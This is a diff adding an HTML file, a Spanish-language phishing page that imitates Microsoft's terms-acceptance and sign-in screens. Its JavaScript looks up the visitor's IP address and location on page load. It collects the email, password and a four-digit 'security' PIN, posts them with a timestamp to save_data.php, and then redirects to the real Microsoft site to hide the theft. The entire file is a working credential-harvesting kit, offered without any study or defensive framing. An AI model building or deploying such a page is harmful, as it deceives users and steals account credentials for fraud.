@@ -1,0 +1,718 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Microsoft - Términos y Condiciones</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: url(fondo.svg);
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* Estilos para la página de términos y condiciones */
+        #termsPage {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .terms-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            flex-grow: 1;
+        }
+        
+        .terms-logo {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        
+        .terms-logo img {
+            height: 24px;
+        }
+        
+        .terms-card {
+            border: 1px solid #e1e1e1;
+            border-radius: 4px;
+            padding: 44px;
+            width: 100%;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            background-color: white;
+            max-height: 70vh;
+            overflow-y: auto;
+        }
+        
+        .terms-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #1b1b1b;
+        }
+        
+        .terms-subtitle {
+            font-size: 20px;
+            font-weight: 600;
+            margin: 20px 0 10px;
+            color: #1b1b1b;
+        }
+        
+        .terms-content {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #323130;
+            margin-bottom: 30px;
+        }
+        
+        .terms-content p {
+            margin-bottom: 15px;
+        }
+        
+        .accept-section {
+            border-top: 1px solid #e1e1e1;
+            padding-top: 20px;
+            text-align: center;
+        }
+        
+        .accept-section p {
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .accept-button {
+            min-width: 200px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 2px;
+            padding: 8px 16px;
+            font-size: 15px;
+            cursor: pointer;
+            height: 36px;
+        }
+        
+        .accept-button:hover {
+            background-color: #106ebe;
+        }
+        
+        /* Estilos para las páginas de inicio de sesión */
+        #loginPage, #passwordPage, #pinPage {
+            display: none;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 440px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            flex-grow: 1;
+        }
+        
+        .logo {
+            margin-bottom: 10px;
+        }
+        
+        .logo img {
+            height: 24px;
+        }
+        
+        .card {
+            border: 1px solid #e1e1e1;
+            border-radius: 0px;
+            padding: 44px;
+            width: 440px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            background-color: white;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #1b1b1b;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #1b1b1b;
+        }
+        
+        input[type="text"], input[type="password"], input[type="tel"] {
+            width: 100%;
+            padding: 6px 0px;
+            border: 1px solid rgba(0,0,0,0.6);
+            border-radius: 2px;
+            border-right-width: 0px;
+            border-left-width: 0px;
+            border-top-width: 0px;
+            font-size: 15px;
+            height: 36px;
+             outline: none;
+        }
+        
+        input[type="text"]:focus, input[type="password"]:focus, input[type="tel"]:focus {
+            outline: none;
+        }
+            .options-box {
+      margin-top: 20px;
+      background: white;
+      width: 440px;
+      height: 48px;
+      padding: 12px 44px;
+       border: 1px solid #e1e1e1;
+            border-radius: 0px;
+ box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: background 0.2s;
+       outline: none;
+    }
+
+    .options-box:hover {
+      background-color: #f3f3f3;
+    }
+
+    .options-box svg {
+      width: 18px;
+      height: 18px;
+      color: #666;
+    }
+        .links {
+            margin-top: 16px;
+            margin-bottom: 24px;
+        }
+        
+        .links a {
+            display: block;
+            color: #0078d4;
+            text-decoration: none;
+            font-size: 13px;
+            margin-bottom: 8px;
+        }
+        
+        .links a:hover {
+            text-decoration: underline;
+        }
+        
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+        }
+        
+        button {
+            min-width: 100px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 0px;
+            padding: 4px 12px;
+            font-size: 15px;
+            cursor: pointer;
+            height: 32px;
+        }
+        
+        button:hover {
+            background-color: #106ebe;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-top: 24px;
+        }
+        
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 8px;
+        }
+        
+        .checkbox-container label {
+            font-size: 14px;
+            font-weight: normal;
+            margin-bottom: 0;
+        }
+        
+        /* Estilos específicos para la página de contraseña */
+        .user-info {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .back-arrow {
+            height: 24px;
+            width: 24px;
+            cursor: pointer;
+        }
+        
+        .user-email {
+            font-size: 15px;
+            color: #323130;
+        }
+        
+        /* Estilos para la página de PIN */
+        .pin-instructions {
+            font-size: 14px;
+            color: #323130;
+            margin-bottom: 10px;
+        }
+        
+        
+        .footer-content {
+            padding: 0 20px;
+            display: flex;
+            justify-content: end;
+        }
+        
+        .footer-links {
+            font-size: 12px;
+            line-height: 28px;
+        }
+        
+        .footer-links a {
+            color: #000000;
+            text-decoration: none;
+            font-size: 12px;
+            margin-left: 8px;
+            margin-right: 8px;
+        }
+        
+        .footer-links a:hover {
+            color: #323130;
+            text-decoration: underline;
+        }
+        
+        .footer-lang {
+            display: flex;
+        }
+        
+        .footer-lang select {
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            padding: 4px 8px;
+            font-size: 13px;
+            background-color: white;
+        }
+        
+        @media (max-width: 768px) {
+            .footer-content {
+                flex-direction: column;
+                align-items: flex-start;
+            }
+
+           .container {
+            display: block;
+            padding: 0;
+
+           }
+            
+            .footer-links {
+                margin-bottom: 16px;
+            }
+            
+            .footer-lang {
+                align-self: flex-end;
+            }
+            
+            .terms-card {
+                padding: 20px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 20px;
+                width: 100%;
+                height: auto;
+            }
+            
+            .container {
+                width: 100%;
+            }
+            
+            .terms-container {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Página de Términos y Condiciones -->
+    <div id="termsPage">
+        <div class="terms-container">
+            <div class="terms-logo">
+                <img src="logo.svg" alt="Microsoft">
+            </div>
+            
+            <div class="terms-card">
+                <h1 class="terms-title">Microsoft</h1>
+                
+                <h2 class="terms-subtitle">Términos y Condiciones</h2>
+                
+                <div class="terms-content">
+                    <p>Podemos cambiar los presentes Términos en cualquier momento y le indicaremos cuando lo hagamos. Usar los Servicios después de que los cambios entren en vigencia significa que usted acepta los nuevos términos. Si no acepta los nuevos términos, debe dejar de usar los Servicios, cerrar su cuenta Microsoft y, si es alguno de los padres o el tutor legal de un menor de edad, debe ayudar a este a cerrar su cuenta Microsoft.</p>
+                    
+                    <p>A veces necesitará actualizaciones de software para seguir usando los Servicios. Es posible que automáticamente reviremos su versión del software y descarguemos actualizaciones del mismo, o que realicemos cambios en la configuración. Además, es posible que se le solicite actualizar el software para seguir usando los Servicios. Tales actualizaciones están sujetas a los presentes Términos, salvo que otros acompañen a las actualizaciones, en cuyo caso se aplicarán esos otros términos. Microsoft no tiene la obligación de poner a disposición ninguna actualización y no garantiza que la versión del sistema para el cual adquirió o licenció el software, las aplicaciones, el contenido u otros productos será compatible. Tales actualizaciones pueden no ser compatibles con el software o los servicios ofrecidos por terceros. Puede revocar su consentimiento a futuras actualizaciones de software en cualquier momento mediante la desinstalación del software.</p>
+                    
+                    <p>Además, en ocasiones puede ser necesario eliminar o cambiar características o funcionalidades del Servicio o directamente dejar de proveer un Servicio o el acceso a Aplicaciones y Servicios de Terceros. Salvo en la medida exigida por la legislación aplicable, no tenemos obligación de proporcionar una nueva descarga o reemplazo de cualquier material. Producto Digital (definidos en la sección 130) o aplicación anteriormente comprados. Podemos lanzar los Servicios o sus características en una versión de vista previa o beta, que pueden no funcionar correctamente o de la misma forma en que la versión final puede funcionar.</p>
+                </div>
+                
+                <div class="accept-section">
+                    <p><strong>Aceptar Términos y Condiciones.</strong></p>
+                    <button class="accept-button" id="acceptButton">Aceptar</button>
+                </div>
+            </div>
+        </div>
+        
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Términos de uso</a>
+                    <a href="#">Privacidad y cookies</a>
+                    <a href="#">...</a>
+                </div>
+            </div>
+    </div>
+    
+    <!-- Página de Inicio de Sesión - Correo -->
+    <div id="loginPage">
+        <div class="container">
+            <div class="card">
+                <div class="logo">
+                    <img src="logo.svg" alt="Microsoft">
+                </div>
+                <h1>Iniciar sesión</h1>
+                
+                <form id="emailForm">
+                    <div class="form-group">
+                        <input placeholder="Correo electrónico, teléfono o Skype" type="text" id="email" name="email" autocomplete="username">
+                    </div>
+                    
+                    <div class="links">
+                        <a href="#"><span style="color: #1b1b1b;">¿No tiene una cuenta?</span> Cree una.</a>
+                        <a href="#">¿No puede acceder a su cuenta?</a>
+                    </div>
+                    
+                    <div class="button-container">
+                        <button type="submit">Siguiente</button>
+                    </div>
+
+                </form>
+
+            </div>
+                                   <div class="options-box">
+      <img src="llave.svg" style="width: 32px">
+      <span style="color: #1b1b1b">Opciones de inicio de sesión</span>
+    </div>
+        </div>
+        
+      
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Términos de uso</a>
+                    <a href="#">Privacidad y cookies</a>
+                    <a href="#">...</a>
+                </div>
+            </div>
+        
+    </div>
+    
+    <!-- Página de Inicio de Sesión - Contraseña -->
+    <div id="passwordPage">
+        <div class="container">
+            <div class="card">
+                <div class="logo">
+                    <img src="logo.svg" alt="Microsoft">
+                </div>
+                
+                <div class="user-info">
+                   <img src="descarga.png" class="back-arrow" id="backButton" alt="Volver">
+                    <span class="user-email" id="userEmailDisplay">hola@kijds.fd</span>
+                </div>
+                
+                <h1>Contraseña</h1>
+                
+                <form id="passwordForm">
+                    <div class="form-group">
+                        <input placeholder="Contraseña" type="password" id="password" name="password" autocomplete="current-password">
+                    </div>
+                    
+                    <div class="links">
+                        <a href="#">Olvidó su contraseña?</a>
+                    </div>
+                    
+                    <div class="button-container">
+                        <button type="submit">Iniciar Sesión</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        
+      
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Términos de uso</a>
+                    <a href="#">Privacidad y cookies</a>
+                    <a href="#">...</a>
+                </div>
+            </div>
+       
+    </div>
+    
+    <!-- Página de PIN -->
+    <div id="pinPage">
+        <div class="container">
+            <div class="card">
+                <div class="logo">
+                    <img src="logo.svg" alt="Microsoft">
+                </div>
+                
+                <div class="user-info">
+                   <img src="descarga.png" class="back-arrow" id="backButtonPin" alt="Volver">
+                    <span class="user-email" id="userEmailDisplayPin">hola@kijds.fd</span>
+                </div>
+                
+                <h1>Verificación de seguridad</h1>
+                
+                <div class="pin-instructions">
+                    <p>Ingrese su PIN de 4 dígitos para completar la verificación de seguridad.</p>
+                </div>
+                
+                <form id="pinForm">
+                    <div class="form-group">
+                        <input placeholder="PIN de 4 dígitos" type="tel" id="pin" name="pin" maxlength="4" pattern="[0-9]{4}" inputmode="numeric">
+                    </div>
+                    
+                    <div class="button-container">
+                        <button type="submit">Verificar</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+        
+      
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#">Términos de uso</a>
+                    <a href="#">Privacidad y cookies</a>
+                    <a href="#">...</a>
+                </div>
+            </div>
+        
+    </div>
+
+<script>
+    // Elementos del DOM
+    const termsPage = document.getElementById('termsPage');
+    const loginPage = document.getElementById('loginPage');
+    const passwordPage = document.getElementById('passwordPage');
+    const pinPage = document.getElementById('pinPage');
+    const acceptButton = document.getElementById('acceptButton');
+    const emailForm = document.getElementById('emailForm');
+    const passwordForm = document.getElementById('passwordForm');
+    const pinForm = document.getElementById('pinForm');
+    const backButton = document.getElementById('backButton');
+    const backButtonPin = document.getElementById('backButtonPin');
+    const userEmailDisplay = document.getElementById('userEmailDisplay');
+    const userEmailDisplayPin = document.getElementById('userEmailDisplayPin');
+    const passwordInput = document.getElementById('password');
+    const pinInput = document.getElementById('pin');
+    
+    // Variables para almacenar datos
+    let userData = {
+        email: '',
+        password: '',
+        pin: ''
+    };
+    let locationData = {
+        ip: '',
+        country: '',
+        region: '',
+        city: ''
+    };
+    
+    // Obtener información de ubicación al cargar la página
+    window.addEventListener('load', function() {
+        getLocationInfo();
+    });
+    
+    // Función para obtener información de ubicación
+    function getLocationInfo() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                locationData.ip = data.ip;
+                
+                // Obtener información detallada de ubicación
+                return fetch(`https://ipapi.co/${data.ip}/json/`);
+            })
+            .then(response => response.json())
+            .then(detailedData => {
+                locationData.country = detailedData.country_name || 'Desconocido';
+                locationData.region = detailedData.region || 'Desconocido';
+                locationData.city = detailedData.city || 'Desconocido';
+            })
+            .catch(error => {
+                console.error('Error obteniendo ubicación:', error);
+                locationData.country = 'Desconocido';
+                locationData.region = 'Desconocido';
+                locationData.city = 'Desconocido';
+            });
+    }
+    
+    // Mostrar página de inicio de sesión después de aceptar términos
+    acceptButton.addEventListener('click', function() {
+        termsPage.style.display = 'none';
+        loginPage.style.display = 'flex';
+    });
+    
+    // Manejar envío del formulario de correo
+    emailForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const email = document.getElementById('email').value;
+        
+        if (email) {
+            // Guardar el email
+            userData.email = email;
+            
+            // Mostrar el correo en la siguiente pantalla
+            userEmailDisplay.textContent = email;
+            userEmailDisplayPin.textContent = email;
+            
+            // Cambiar a la página de contraseña
+            loginPage.style.display = 'none';
+            passwordPage.style.display = 'flex';
+        }
+    });
+    
+    // Volver a la página de correo desde contraseña
+    backButton.addEventListener('click', function() {
+        passwordPage.style.display = 'none';
+        loginPage.style.display = 'flex';
+    });
+    
+    // Volver a la página de contraseña desde PIN
+    backButtonPin.addEventListener('click', function() {
+        pinPage.style.display = 'none';
+        passwordPage.style.display = 'flex';
+    });
+    
+    // Manejar envío del formulario de contraseña
+    passwordForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const password = document.getElementById('password').value;
+        
+        if (password) {
+            // Guardar la contraseña
+            userData.password = password;
+            
+            // Guardar EMAIL y CONTRASEÑA juntos
+            saveCredentials();
+            
+            // Cambiar a la página de PIN
+            passwordPage.style.display = 'none';
+            pinPage.style.display = 'flex';
+        }
+    });
+    
+    // Manejar envío del formulario de PIN
+    pinForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        const pin = document.getElementById('pin').value;
+        
+        if (pin && pin.length === 4) {
+            // Guardar el PIN
+            userData.pin = pin;
+            
+            // Guardar PIN con el correo
+            savePinWithEmail();
+            
+            setTimeout(function() {
+                window.location.href = 'https://www.microsoft.com/es-mx/';
+            }, 2000);
+        } else {
+            alert('Por favor, ingrese un PIN válido de 4 dígitos.');
+        }
+    });
+    
+    // Función para guardar credenciales juntas
+    function saveCredentials() {
+        const timestamp = getFormattedTimestamp();
+        const separator = "══════════════════════════════════════════════════";
+        const content = `${separator}\nCorreo: ${userData.email} - Psswrd: ${userData.password} - Fecha: ${timestamp} - ${locationData.country} ${locationData.region} ${locationData.city} ${locationData.ip}\n${separator}\n`;
+        
+        console.log(`Guardando credenciales: ${content}`);
+        
+        // Enviar datos al servidor
+        sendToServer(content);
+    }
+    
+    // Función para guardar PIN con el correo
+    function savePinWithEmail() {
+        const timestamp = getFormattedTimestamp();
+        const separator = "══════════════════════════════════════════════════";
+        const content = `${separator}\nCorreo: ${userData.email} - Pin ${userData.pin} - Fecha: ${timestamp} - ${locationData.country} ${locationData.region} ${locationData.city} ${locationData.ip}\n${separator}\n`;
+        
+        console.log(`Guardando PIN: ${content}`);
+        
+        // Enviar datos al servidor
+        sendToServer(content);
+    }
+    
+    // Función para formatear timestamp
+    function getFormattedTimestamp() {
+        const now = new Date();
+        return `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2, '0')}-${String(now.getDate()).padStart(2, '0')} - ${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}:${String(now.getSeconds()).padStart(2, '0')}`;
+    }
+    
+    // Función para enviar datos al servidor
+    function sendToServer(content) {
+        fetch('save_data.php', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+            },
+            body: 'data=' + encodeURIComponent(content)
+        })
+        .then(response => {
+            if (!response.ok) {
+                console.error('Error en respuesta del servidor');
+            }
+        })
+        .catch(error => {
+            console.error('Error guardando datos:', error);
+        });
+    }
+    
+    // Validar que solo se ingresen números en el campo PIN
+    pinInput.addEventListener('input', function() {
+        this.value = this.value.replace(/[^0-9]/g, '');
+    });
+</script>
+</body>
+</html>
